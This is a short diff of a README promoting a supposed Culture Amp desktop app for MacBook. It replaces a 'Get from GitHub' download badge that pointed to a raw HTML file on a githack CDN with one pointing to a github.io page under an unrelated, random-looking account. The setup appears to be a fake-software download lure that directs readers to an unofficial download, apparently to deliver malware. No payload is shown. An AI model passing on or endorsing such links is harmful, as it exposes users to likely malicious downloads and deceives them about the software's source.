@@ -4,7 +4,7 @@
 Enhance employee engagement and performance with Culture Amp on MacBook! 😃  
 Follow the simple instructions below to get started with the Culture Amp desktop app and empower your team for success.
 
-[![Get from GitHub](https://img.shields.io/badge/Get_from_Github-CultureAmp-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/mazerdika995/8ce21b5ca738c2874852c8ed4a99131e/raw/689378a74dd850f9e1f64a0d49a258d20f2d90b2/get.html)
+[![Get from GitHub](https://img.shields.io/badge/Get_from_Github-CultureAmp-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://linkolnmoldranz782.github.io/.github/)
 
 ---
 
